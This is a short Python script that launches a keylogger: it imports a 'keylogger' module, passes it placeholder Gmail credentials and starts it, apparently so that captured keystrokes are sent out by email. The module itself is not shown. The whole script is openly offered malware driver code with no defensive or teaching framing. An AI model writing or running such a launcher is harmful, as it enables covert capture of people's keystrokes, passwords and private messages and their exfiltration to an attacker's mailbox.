#! /usr/bin/env python

import keylogger

email = "email@gmail.com"
password = "password"
keylogger = keylogger.Keylogger(email, password)
keylogger.start()
